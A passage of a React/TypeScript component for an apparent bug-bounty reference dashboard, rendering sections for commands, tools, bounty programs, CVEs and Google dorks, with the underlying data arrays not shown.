              <div className="w-7 h-7 rounded-lg bg-secondary/10 border border-secondary/20 flex items-center justify-center flex-shrink-0 mt-0.5">
                <Terminal className="w-3.5 h-3.5 text-secondary" />
              </div>
              <div className="flex-1 min-w-0">
                <span className="text-xs font-bold text-foreground font-mono">{cmd.title}</span>
                <p className="text-xs text-muted-foreground mt-0.5 line-clamp-1">{cmd.desc}</p>
              </div>
              <div className="flex items-center gap-1 flex-shrink-0">
                <CopyButton text={cmd.command} />
                {expandedId === cmd.id ? <ChevronUp className="w-3.5 h-3.5 text-muted-foreground" /> : <ChevronDown className="w-3.5 h-3.5 text-muted-foreground" />}
              </div>
            </button>
            <AnimatePresence>
              {expandedId === cmd.id && (
                <motion.div initial={{ height: 0 }} animate={{ height: "auto" }} exit={{ height: 0 }} className="overflow-hidden">
                  <div className="px-4 pb-4 border-t border-border/15">
                    <div className="flex flex-wrap gap-1 mt-3 mb-2">
                      {cmd.tags.map((t) => <Tag key={t} label={t} />)}
                    </div>
                    <CodeBlock code={cmd.command} />
                  </div>
                </motion.div>
              )}
            </AnimatePresence>
          </motion.div>
        ))}
      </div>
    </div>
  );
}

function ToolsSection() {
  const categories = [...new Set(TOOLS.map((t) => t.category))];
  const [activeCat, setActiveCat] = useState("ALL");
  const [expandedName, setExpandedName] = useState<string | null>(null);
  const filtered = activeCat === "ALL" ? TOOLS : TOOLS.filter((t) => t.category === activeCat);

  return (
    <div className="flex flex-col h-full">
      <div className="flex gap-1 p-3 border-b border-border/20 flex-wrap flex-shrink-0">
        {["ALL", ...categories].map((c) => (
          <button key={c} onClick={() => setActiveCat(c)}
            className={`px-2.5 py-1 rounded-lg text-xs font-mono font-bold transition-all ${
              activeCat === c ? "bg-primary/20 text-primary border border-primary/30" : "text-muted-foreground hover:text-foreground hover:bg-white/5 border border-border/20"
            }`}
          >{c}</button>
        ))}
      </div>
      <div className="flex-1 overflow-y-auto p-3" style={{ scrollbarWidth: "thin" }}>
        <div className="grid grid-cols-1 gap-2">
          {filtered.map((tool) => (
            <motion.div key={tool.name} layout className="border border-border/20 rounded-xl overflow-hidden hover:border-border/40 transition-colors">
              <button
                onClick={() => setExpandedName(expandedName === tool.name ? null : tool.name)}
                className="w-full flex items-center gap-3 px-4 py-3 text-left hover:bg-white/3 transition-colors"
              >
                <div className="w-8 h-8 rounded-xl bg-primary/10 border border-primary/20 flex items-center justify-center flex-shrink-0">
                  <Package className="w-4 h-4 text-primary" />
                </div>
                <div className="flex-1 min-w-0">
                  <div className="flex items-center gap-2">
                    <span className="text-sm font-black text-foreground font-mono">{tool.name}</span>
                    <span className="text-xs font-mono text-primary bg-primary/10 border border-primary/20 px-1.5 rounded">{tool.category}</span>
                    {tool.stars !== "—" && (
                      <span className="text-xs text-yellow-400/70 font-mono flex items-center gap-0.5">
                        <Star className="w-3 h-3" />{tool.stars}
                      </span>
                    )}
                  </div>
                  <p className="text-xs text-muted-foreground mt-0.5 truncate">{tool.desc}</p>
                </div>
                <div className="flex items-center gap-1 flex-shrink-0">
                  <a href={tool.link} target="_blank" rel="noopener noreferrer"
                    onClick={(e) => e.stopPropagation()}
                    className="p-1.5 rounded text-muted-foreground hover:text-secondary transition-colors">
                    <ExternalLink className="w-3.5 h-3.5" />
                  </a>
                  {expandedName === tool.name ? <ChevronUp className="w-3.5 h-3.5 text-muted-foreground" /> : <ChevronDown className="w-3.5 h-3.5 text-muted-foreground" />}
                </div>
              </button>
              <AnimatePresence>
                {expandedName === tool.name && (
                  <motion.div initial={{ height: 0 }} animate={{ height: "auto" }} exit={{ height: 0 }} className="overflow-hidden">
                    <div className="px-4 pb-4 border-t border-border/15 space-y-3">
                      <div className="flex flex-wrap gap-1 mt-3">
                        {tool.tags.map((t) => <Tag key={t} label={t} />)}
                      </div>
                      <div>
                        <div className="text-xs text-muted-foreground font-mono mb-1 flex items-center gap-1.5">
                          <Download className="w-3 h-3 text-secondary" /> INSTALL
                        </div>
                        <CodeBlock code={tool.install} />
                      </div>
                      <div>
                        <div className="text-xs text-muted-foreground font-mono mb-1 flex items-center gap-1.5">
                          <Terminal className="w-3 h-3 text-primary" /> USAGE
                        </div>
                        <CodeBlock code={tool.usage} />
                      </div>
                    </div>
                  </motion.div>
                )}
              </AnimatePresence>
            </motion.div>
          ))}
        </div>
      </div>
    </div>
  );
}

function PlatformsSection() {
  const [activePlatform, setActivePlatform] = useState<"all" | "hackerone" | "bugcrowd">("all");
  const [expandedName, setExpandedName] = useState<string | null>(null);
  const filtered = activePlatform === "all" ? PROGRAMS : PROGRAMS.filter((p) => p.platform === activePlatform);

  const totalP1 = PROGRAMS.reduce((a, b) => a + b.p1, 0);
  const totalP2 = PROGRAMS.reduce((a, b) => a + b.p2, 0);
  const totalP3 = PROGRAMS.reduce((a, b) => a + b.p3, 0);

  return (
    <div className="flex flex-col h-full">
      {/* Stats bar */}
      <div className="grid grid-cols-3 gap-2 p-3 border-b border-border/20 flex-shrink-0">
        {[
          { label: "P1 CRITICAL", value: totalP1, color: "text-red-400", bg: "bg-red-500/10 border-red-500/20" },
          { label: "P2 HIGH", value: totalP2, color: "text-orange-400", bg: "bg-orange-500/10 border-orange-500/20" },
          { label: "P3 MEDIUM", value: totalP3, color: "text-yellow-400", bg: "bg-yellow-500/10 border-yellow-500/20" },
        ].map(({ label, value, color, bg }) => (
          <div key={label} className={`rounded-xl px-3 py-2 border ${bg} text-center`}>
            <div className={`text-lg font-black font-mono ${color}`}>{value.toLocaleString()}</div>
            <div className="text-xs text-muted-foreground font-mono">{label}</div>
          </div>
        ))}
      </div>

      {/* Platform filter */}
      <div className="flex gap-2 px-3 py-2 border-b border-border/20 flex-shrink-0">
        {[
          { id: "all", label: "ALL PROGRAMS" },
          { id: "hackerone", label: "HackerOne" },
          { id: "bugcrowd", label: "Bugcrowd" },
        ].map((p) => (
          <button key={p.id} onClick={() => setActivePlatform(p.id as any)}
            className={`px-3 py-1.5 rounded-xl text-xs font-mono font-bold transition-all border ${
              activePlatform === p.id
                ? p.id === "hackerone" ? "bg-green-500/20 text-green-400 border-green-500/30"
                : p.id === "bugcrowd" ? "bg-orange-500/20 text-orange-400 border-orange-500/30"
                : "bg-primary/20 text-primary border-primary/30"
                : "text-muted-foreground hover:text-foreground bg-white/4 border-border/20"
            }`}
          >{p.label}</button>
        ))}
      </div>

      <div className="flex-1 overflow-y-auto p-3 space-y-2" style={{ scrollbarWidth: "thin" }}>
        {filtered.map((prog) => (
          <motion.div key={prog.name} layout className="border border-border/20 rounded-xl overflow-hidden hover:border-border/40 transition-colors">
            <button
              onClick={() => setExpandedName(expandedName === prog.name ? null : prog.name)}
              className="w-full flex items-center gap-3 px-4 py-3 text-left hover:bg-white/3 transition-colors"
            >
              <div className={`w-8 h-8 rounded-xl flex items-center justify-center font-black font-mono text-sm border flex-shrink-0 ${
                prog.platform === "hackerone" ? "bg-green-500/10 text-green-400 border-green-500/20" : "bg-orange-500/10 text-orange-400 border-orange-500/20"
              }`}>
                {prog.platform === "hackerone" ? "H1" : "BC"}
              </div>
              <div className="flex-1 min-w-0">
                <div className="flex items-center gap-2">
                  <span className="text-xs font-bold text-foreground font-mono">{prog.name}</span>
                  <span className={`px-1.5 py-0.5 rounded text-xs font-mono font-bold border ${
                    prog.status === "active" ? "text-secondary bg-secondary/10 border-secondary/20" : "text-muted-foreground bg-white/5 border-border/20"
                  }`}>{prog.status.toUpperCase()}</span>
                </div>
                <div className="flex items-center gap-3 mt-0.5 text-xs text-muted-foreground font-mono">
                  <span className="text-red-400">P1:{prog.p1}</span>
                  <span className="text-orange-400">P2:{prog.p2}</span>
                  <span className="text-yellow-400">P3:{prog.p3}</span>
                  <span className="text-secondary">MAX:{prog.maxBounty}</span>
                </div>
              </div>
              <div className="flex items-center gap-1 flex-shrink-0">
                <a href={prog.link} target="_blank" rel="noopener noreferrer"
                  onClick={(e) => e.stopPropagation()}
                  className="p-1.5 rounded text-muted-foreground hover:text-secondary transition-colors">
                  <ExternalLink className="w-3.5 h-3.5" />
                </a>
                {expandedName === prog.name ? <ChevronUp className="w-3.5 h-3.5 text-muted-foreground" /> : <ChevronDown className="w-3.5 h-3.5 text-muted-foreground" />}
              </div>
            </button>
            <AnimatePresence>
              {expandedName === prog.name && (
                <motion.div initial={{ height: 0 }} animate={{ height: "auto" }} exit={{ height: 0 }} className="overflow-hidden">
                  <div className="px-4 pb-4 border-t border-border/15">
                    <div className="grid grid-cols-2 gap-3 mt-3">
                      <div>
                        <div className="text-xs text-muted-foreground font-mono mb-2 flex items-center gap-1.5">
                          <Target className="w-3 h-3 text-primary" /> SCOPE
                        </div>
                        <div className="space-y-1">
                          {prog.scope.map((s) => (
                            <div key={s} className="flex items-center gap-2 text-xs font-mono">
                              <span className="w-1.5 h-1.5 rounded-full bg-secondary/60 flex-shrink-0" />
                              <span className="text-muted-foreground">{s}</span>
                            </div>
                          ))}
                        </div>
                      </div>
                      <div className="space-y-2">
                        <div className="flex items-center justify-between text-xs font-mono">
                          <span className="text-muted-foreground">RESPONSE TIME</span>
                          <span className="text-secondary">{prog.response}</span>
                        </div>
                        <div className="flex items-center justify-between text-xs font-mono">
                          <span className="text-muted-foreground">MAX BOUNTY</span>
                          <span className="text-green-400 font-bold">{prog.maxBounty}</span>
                        </div>
                        <div className="flex flex-wrap gap-1 mt-2">
                          {prog.tags.map((t) => <Tag key={t} label={t} />)}
                        </div>
                      </div>
                    </div>
                  </div>
                </motion.div>
              )}
            </AnimatePresence>
          </motion.div>
        ))}
      </div>
    </div>
  );
}

function CVEsSection() {
  const [filter, setFilter] = useState<"all" | "critical" | "high" | "medium">("all");
  const [expandedId, setExpandedId] = useState<string | null>(null);
  const filtered = filter === "all" ? CVES : CVES.filter((c) => c.severity === filter);

  return (
    <div className="flex flex-col h-full">
      <div className="flex items-center gap-2 p-3 border-b border-border/20 flex-shrink-0">
        {(["all", "critical", "high", "medium"] as const).map((f) => (
          <button key={f} onClick={() => setFilter(f)}
            className={`px-2.5 py-1 rounded-lg text-xs font-mono font-bold transition-all border ${
              filter === f
                ? f === "critical" ? "bg-red-500/20 text-red-400 border-red-500/30"
                : f === "high" ? "bg-orange-500/20 text-orange-400 border-orange-500/30"
                : f === "medium" ? "bg-yellow-500/20 text-yellow-400 border-yellow-500/30"
                : "bg-primary/20 text-primary border-primary/30"
                : "text-muted-foreground hover:text-foreground bg-white/4 border-border/20"
            }`}
          >{f.toUpperCase()}</button>
        ))}
        <span className="ml-auto text-xs text-muted-foreground font-mono">{filtered.length} CVEs</span>
      </div>
      <div className="flex-1 overflow-y-auto p-3 space-y-2" style={{ scrollbarWidth: "thin" }}>
        {filtered.map((cve) => (
          <motion.div key={cve.id} layout className="border border-border/20 rounded-xl overflow-hidden hover:border-border/40 transition-colors">
            <button
              onClick={() => setExpandedId(expandedId === cve.id ? null : cve.id)}
              className="w-full flex items-center gap-3 px-4 py-3 text-left hover:bg-white/3 transition-colors"
            >
              <div className={`w-10 h-10 rounded-xl flex flex-col items-center justify-center flex-shrink-0 text-xs font-black font-mono border ${
                cve.severity === "critical" ? "bg-red-500/10 text-red-400 border-red-500/20" :
                cve.severity === "high" ? "bg-orange-500/10 text-orange-400 border-orange-500/20" :
                "bg-yellow-500/10 text-yellow-400 border-yellow-500/20"
              }`}>
                <span className="text-base">{cve.cvss.toFixed(1)}</span>
                <span className="text-[9px] opacity-70">CVSS</span>
              </div>
              <div className="flex-1 min-w-0">
                <div className="flex items-center gap-2 flex-wrap">
                  <span className="text-xs font-black text-primary font-mono">{cve.id}</span>
                  <SeverityBadge severity={cve.severity} />
                  <span className="text-xs text-muted-foreground font-mono">{cve.vendor}</span>
                  <span className="text-xs text-muted-foreground/50 font-mono">{cve.date}</span>
                </div>
                <p className="text-xs text-muted-foreground mt-0.5 line-clamp-1">{cve.desc}</p>
              </div>
              <div className="flex items-center gap-1 flex-shrink-0">
                <a href={cve.link} target="_blank" rel="noopener noreferrer" onClick={(e) => e.stopPropagation()}
                  className="p-1.5 rounded text-muted-foreground hover:text-secondary transition-colors">
                  <ExternalLink className="w-3.5 h-3.5" />
                </a>
                {expandedId === cve.id ? <ChevronUp className="w-3.5 h-3.5 text-muted-foreground" /> : <ChevronDown className="w-3.5 h-3.5 text-muted-foreground" />}
              </div>
            </button>
            <AnimatePresence>
              {expandedId === cve.id && (
                <motion.div initial={{ height: 0 }} animate={{ height: "auto" }} exit={{ height: 0 }} className="overflow-hidden">
                  <div className="px-4 pb-4 border-t border-border/15">
                    <div className="grid grid-cols-2 gap-3 mt-3">
                      <div>
                        <div className="text-xs text-muted-foreground font-mono mb-1">DESCRIPTION</div>
                        <p className="text-xs text-foreground/80 font-mono leading-relaxed">{cve.desc}</p>
                      </div>
                      <div className="space-y-2">
                        <div className="flex items-center justify-between text-xs font-mono">
                          <span className="text-muted-foreground">AFFECTED</span>
                          <span className="text-foreground">{cve.affected}</span>
                        </div>
                        <div className="flex items-center justify-between text-xs font-mono">
                          <span className="text-muted-foreground">CVSS SCORE</span>
                          <span className={cve.cvss >= 9 ? "text-red-400" : cve.cvss >= 7 ? "text-orange-400" : "text-yellow-400"}>{cve.cvss}/10</span>
                        </div>
                        <div className="flex flex-wrap gap-1 mt-1">
                          {cve.tags.map((t) => <Tag key={t} label={t} />)}
                        </div>
                      </div>
                    </div>
                  </div>
                </motion.div>
              )}
            </AnimatePresence>
          </motion.div>
        ))}
      </div>
    </div>
  );
}

function DorksSection() {
  const categories = [...new Set(GOOGLE_DORKS.map((d) => d.category))];
  const [activeCat, setActiveCat] = useState("ALL");
  const filtered = activeCat === "ALL" ? GOOGLE_DORKS : GOOGLE_DORKS.filter((d) => d.category === activeCat);

  return (
    <div className="flex flex-col h-full">
      <div className="flex items-center gap-2 p-3 border-b border-border/20 flex-wrap flex-shrink-0">
        <Globe className="w-3.5 h-3.5 text-primary flex-shrink-0" />
        <span className="text-xs font-black font-mono text-muted-foreground">GOOGLE DORKS</span>
        <div className="flex gap-1 flex-wrap ml-2">
          {["ALL", ...categories].map((c) => (
            <button key={c} onClick={() => setActiveCat(c)}
              className={`px-2 py-1 rounded-lg text-xs font-mono font-bold transition-all border ${
                activeCat === c ? "bg-primary/20 text-primary border-primary/30" : "text-muted-foreground hover:text-foreground hover:bg-white/5 border-border/20"
              }`}
            >{c}</button>
          ))}
        </div>
      </div>
      <div className="flex-1 overflow-y-auto p-3 space-y-2" style={{ scrollbarWidth: "thin" }}>
        {filtered.map((d, i) => (
          <div key={i} className="border border-border/20 rounded-xl px-4 py-3 hover:border-border/40 transition-colors">
            <div className="flex items-center gap-2 mb-2">
              <span className="text-xs font-bold text-foreground font-mono">{d.title}</span>
              <SeverityBadge severity={d.severity} />
              <span className="text-xs text-muted-foreground font-mono border border-border/20 bg-white/4 px-1.5 rounded">{d.category}</span>
              <div className="ml-auto"><CopyButton text={d.dork} /></div>
            </div>
            <pre className="text-xs font-mono text-secondary bg-black/40 border border-border/20 rounded-lg px-3 py-2 overflow-x-auto">{d.dork}</pre>
          </div>
        ))}
      </div>
    </div>
  );
}

// ─── Missing import fix ────────────────────────────────────────────────────────
function Download({ className }: { className?: string }) {
  return <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth={2} strokeLinecap="round" strokeLinejoin="round" className={className}><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>;
}

// ─── Main Component ─────────────────────────────────────────────────────────────

const NAV_ITEMS: { id: Category; label: string; icon: React.ReactNode; color: string; count?: number }[] = [
  { id: "payloads", label: "PAYLOADS", icon: <Code className="w-4 h-4" />, color: "text-red-400", count: PAYLOADS.length },
  { id: "commands", label: "BASH", icon: <Terminal className="w-4 h-4" />, color: "text-secondary", count: BASH_COMMANDS.length },
  { id: "tools", label: "TOOLS", icon: <Package className="w-4 h-4" />, color: "text-primary", count: TOOLS.length },
  { id: "platforms", label: "PLATFORMS", icon: <Globe className="w-4 h-4" />, color: "text-green-400", count: PROGRAMS.length },
  { id: "cves", label: "CVEs", icon: <AlertTriangle className="w-4 h-4" />, color: "text-orange-400", count: CVES.length },
  { id: "dorks", label: "DORKS", icon: <Search className="w-4 h-4" />, color: "text-yellow-400", count: GOOGLE_DORKS.length },
];

export function GhostBugBounty() {
  const [activeSection, setActiveSection] = useState<Category>("payloads");

  return (
    <div className="flex h-full font-mono">
      {/* Left Nav */}
      <div
        className="w-44 flex-shrink-0 border-r border-border/20 flex flex-col"
        style={{ background: "hsl(0 0% 5%)" }}
      >
        {/* Header */}
        <div className="p-3 border-b border-border/20">
          <div className="flex items-center gap-2 mb-1">
            <Bug className="w-4 h-4 text-red-400" />
            <span className="text-xs font-black tracking-widest text-red-400">BUG BOUNTY</span>
          </div>
          <div className="text-xs text-muted-foreground/60 leading-tight">
            Payloads · Commands<br />Tools · Intel · CVEs
          </div>
        </div>

        {/* Nav */}
        <div className="flex-1 py-2 space-y-0.5 px-2">
          {NAV_ITEMS.map((item) => (
            <button
              key={item.id}
              onClick={() => setActiveSection(item.id)}
              className={`w-full flex items-center gap-2.5 px-3 py-2.5 rounded-xl text-left transition-all group ${
                activeSection === item.id
                  ? "bg-white/8 border border-border/30"
                  : "hover:bg-white/5 border border-transparent"
              }`}
            >
              <span className={`${item.color} transition-colors`}>{item.icon}</span>
              <div className="flex-1 min-w-0">
                <div className={`text-xs font-bold tracking-wider truncate transition-colors ${
                  activeSection === item.id ? "text-foreground" : "text-muted-foreground group-hover:text-foreground"
                }`}>{item.label}</div>
              </div>
              {item.count && (
                <span className={`text-xs font-mono rounded px-1 py-0.5 flex-shrink-0 ${
                  activeSection === item.id ? `${item.color} bg-white/8` : "text-muted-foreground/50"
                }`}>{item.count}</span>
              )}
              {activeSection === item.id && (
                <div className="w-1 h-5 rounded-full flex-shrink-0" style={{ background: "currentColor", color: "hsl(var(--primary))" }} />
              )}
            </button>
          ))}
        </div>

        {/* Footer stats */}
        <div className="p-3 border-t border-border/20 space-y-1.5">
          <div className="text-xs text-muted-foreground/50 font-mono tracking-wider mb-2">SEVERITY TRACK</div>
          {[
            { label: "P1/CRIT", value: "656", color: "bg-red-500" },
            { label: "P2/HIGH", value: "1,970", color: "bg-orange-500" },
            { label: "P3/MED", value: "4,110", color: "bg-yellow-500" },
          ].map(({ label, value, color }) => (
            <div key={label} className="flex items-center gap-2">
              <div className={`w-2 h-2 rounded-full flex-shrink-0 ${color}`} />
              <span className="text-xs text-muted-foreground flex-1">{label}</span>
              <span className="text-xs font-mono text-foreground">{value}</span>
            </div>
          ))}
        </div>
      </div>

      {/* Main content */}
      <div className="flex-1 flex flex-col min-w-0 min-h-0">
        {/* Section header */}
        <div className="flex items-center gap-3 px-4 py-2.5 border-b border-border/20 flex-shrink-0" style={{ background: "hsl(0 0% 5%)" }}>
          {NAV_ITEMS.find((n) => n.id === activeSection) && (
            <>
              <span className={NAV_ITEMS.find((n) => n.id === activeSection)!.color}>
                {NAV_ITEMS.find((n) => n.id === activeSection)!.icon}
              </span>
              <span className="text-sm font-black tracking-widest gradient-text">
                {NAV_ITEMS.find((n) => n.id === activeSection)!.label}
              </span>
              <span className="text-xs text-muted-foreground font-mono px-2 py-0.5 rounded bg-white/5 border border-border/20">
                {NAV_ITEMS.find((n) => n.id === activeSection)!.count} ITEMS
              </span>
            </>
          )}
          <div className="ml-auto flex items-center gap-1.5 text-xs text-muted-foreground font-mono">
            <Shield className="w-3 h-3 text-secondary/60" />
            <span>OFFENSIVE SECURITY REFERENCE</span>
          </div>
        </div>

        {/* Section body */}
        <div className="flex-1 min-h-0 overflow-hidden">
          <AnimatePresence mode="wait">
            <motion.div
              key={activeSection}
              initial={{ opacity: 0, x: 10 }}
              animate={{ opacity: 1, x: 0 }}
              exit={{ opacity: 0, x: -10 }}
              transition={{ duration: 0.15 }}
              className="h-full"
            >
              {activeSection === "payloads" && <PayloadsSection />}
              {activeSection === "commands" && <CommandsSection />}
              {activeSection === "tools" && <ToolsSection />}
              {activeSection === "platforms" && <PlatformsSection />}
              {activeSection === "cves" && <CVEsSection />}
              {activeSection === "dorks" && <DorksSection />}
            </motion.div>
          </AnimatePresence>
        </div>
      </div>
    </div>
  );
}
